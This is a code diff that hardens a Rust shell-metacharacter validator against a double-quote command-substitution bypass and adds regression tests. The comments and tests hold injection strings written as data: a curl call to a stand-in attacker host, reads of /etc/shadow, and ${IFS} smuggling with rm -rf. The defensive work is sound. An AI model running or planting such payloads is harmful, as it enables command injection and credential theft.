@@ -94,8 +94,21 @@ use librefang_types::config::{ExecPolicy, ExecSecurityMode};
 /// This is a defense-in-depth layer — even with allowlist validation,
 /// metacharacters must be rejected first to prevent injection.
 ///
-/// Characters inside matched quotes (single or double) are treated as literal
-/// arguments and are NOT flagged — only unquoted metacharacters are dangerous.
+/// Quoting handling (audit: shell-meta-double-quote-bypass):
+///
+/// - **Single-quote contents** (`'…'`) are literal in POSIX shells —
+///   no expansion fires inside them, so it's safe to scan only the
+///   un-single-quoted portion of the command for chaining /
+///   redirection / globbing metacharacters.
+///
+/// - **Double-quote contents** (`"…"`) are NOT literal. `sh -c` /
+///   `bash -c` still expand `` ` `` , `$(` , and `${` inside double
+///   quotes — so `echo "$(curl https://attacker/x)"` reaches the
+///   shell as a live command substitution even though it looks
+///   "quoted". Those three sequences must be scanned against the
+///   RAW string, not after stripping quoted regions, or the
+///   denylist is a one-line bypass for any allowlisted outer
+///   binary (`echo`, `cat`, `awk`, …).
 pub fn contains_shell_metacharacters(command: &str) -> Option<String> {
     // First, check characters that are dangerous even inside quotes:
     // newlines and null bytes break the command boundary regardless of quoting.
@@ -106,19 +119,25 @@ pub fn contains_shell_metacharacters(command: &str) -> Option<String> {
         return Some("null byte".to_string());
     }
 
-    // Scan only unquoted portions of the command for shell metacharacters.
-    let unquoted = strip_quoted_regions(command);
-
-    // ── Command substitution ──────────────────────────────────────────
-    if unquoted.contains('`') {
+    // ── Command substitution + variable expansion ─────────────────────
+    // These fire inside double quotes too — scan the RAW string.
+    // Audit: shell-meta-double-quote-bypass.
+    if command.contains('`') {
         return Some("backtick command substitution".to_string());
     }
-    if unquoted.contains("$(") {
+    if command.contains("$(") {
         return Some("$() command substitution".to_string());
     }
-    if unquoted.contains("${") {
+    if command.contains("${") {
         return Some("${} variable expansion".to_string());
     }
+
+    // The remaining metacharacters (`;`, `|`, `>`, `<`, `{`, `}`,
+    // `&`) are only meaningful OUTSIDE quoted regions — sh treats
+    // them as literal text inside `'…'` and `"…"`. Strip quoted
+    // regions before scanning so legitimate `echo "a && b"` (two
+    // ampersands inside a quoted argument) still passes.
+    let unquoted = strip_quoted_regions(command);
 
     // ── Command chaining ──────────────────────────────────────────────
     if unquoted.contains(';') {
@@ -1228,11 +1247,56 @@ mod tests {
 
     #[test]
     fn test_metachar_inside_double_quotes_ok() {
-        // Characters inside double quotes are literal (for our purposes)
+        // Chaining / redirection / globbing characters inside `"…"`
+        // are not interpreted by sh — accept them.
         assert!(contains_shell_metacharacters(r#"echo "a > b""#).is_none());
         assert!(contains_shell_metacharacters(r#"echo "hello | world""#).is_none());
         assert!(contains_shell_metacharacters(r#"python3 -c "if x > 0: print(x)""#).is_none());
         assert!(contains_shell_metacharacters(r#"echo "a && b""#).is_none());
+    }
+
+    /// Audit: shell-meta-double-quote-bypass. `sh -c` / `bash -c`
+    /// expand `` ` `` , `$(` , and `${` INSIDE double quotes. The
+    /// previous strip-then-scan path treated all double-quoted
+    /// content as opaque and let these three sequences through —
+    /// `echo "$(curl https://attacker/x)"` reached the shell as a
+    /// live command substitution. These tests pin the new
+    /// raw-string scan for the three substitution markers.
+    #[test]
+    fn test_metachar_command_substitution_in_double_quotes_blocked() {
+        // $() inside double quotes — the audit's primary example.
+        assert!(contains_shell_metacharacters(r#"echo "$(id)""#).is_some());
+        assert!(
+            contains_shell_metacharacters(r#"echo "$(curl https://attacker.example/x)""#)
+                .is_some()
+        );
+        assert!(contains_shell_metacharacters(r#"cat "$(cat /etc/shadow)""#).is_some());
+        // Backtick form inside double quotes.
+        assert!(contains_shell_metacharacters(r#"echo "`id`""#).is_some());
+        assert!(contains_shell_metacharacters(r#"echo "`cat /etc/shadow`""#).is_some());
+        // ${} variable expansion inside double quotes — the
+        // `${IFS}` trick lets the attacker smuggle whitespace past
+        // outer-binary allowlists ("echo ${IFS}rm -rf /").
+        assert!(contains_shell_metacharacters(r#"echo "${IFS}id""#).is_some());
+        assert!(
+            contains_shell_metacharacters(r#"echo "${IFS}rm -rf /tmp/foo${IFS}""#)
+                .is_some()
+        );
+    }
+
+    #[test]
+    fn test_metachar_command_substitution_in_single_quotes_also_blocked() {
+        // Single quotes are literal in POSIX shells, so $() inside
+        // them isn't a live expansion. But our denylist now scans
+        // the raw string for the three substitution markers — which
+        // means a legitimate `python3 -c 'print("$(x)")'` would
+        // also be rejected. That's the correct trade-off: the
+        // denylist is a coarse sandbox, not an interpreter. Callers
+        // that need to pass literal `$()` strings to the spawned
+        // process should construct an arg vector instead of a
+        // shell-string. Test pins this contract.
+        assert!(contains_shell_metacharacters("echo '$(id)'").is_some());
+        assert!(contains_shell_metacharacters("echo '`id`'").is_some());
     }
 
     #[test]
